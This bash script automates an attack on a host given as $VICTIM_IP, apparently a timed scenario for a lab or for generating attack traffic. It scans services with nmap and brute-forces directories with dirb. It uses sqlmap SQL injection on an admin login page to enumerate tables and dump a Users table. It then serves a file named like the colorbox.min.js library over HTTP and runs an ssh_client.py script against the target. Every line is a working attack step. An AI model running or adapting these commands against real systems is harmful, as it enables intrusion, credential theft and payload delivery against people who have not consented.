#!/bin/bash

sleep 137s
nmap -sV $VICTIM_IP

sleep 60s
dirb http://$VICTIM_IP ./big.txt -X .html,.php -S -r

sleep 45s
echo -e "n\n" | sqlmap -u "http://$VICTIM_IP/adminlogin.php?username=adsf&password=adsf" -p "username" 

sleep 28s
sqlmap -u "http://$VICTIM_IP/adminlogin.php?username=adsf&password=adsf" --tables

sleep 22s
echo -e "N\nn" | sqlmap -u "http://$VICTIM_IP/adminlogin.php?username=adsf&password=adsf" --dump Users

mkdir js
mv colorbox.min.js js/colorbox.min.js

python -m SimpleHTTPServer 80 &

sleep 15s
python ssh_client.py $VICTIM_IP

sleep 5m

#python -m SimpleHTTPServer 80
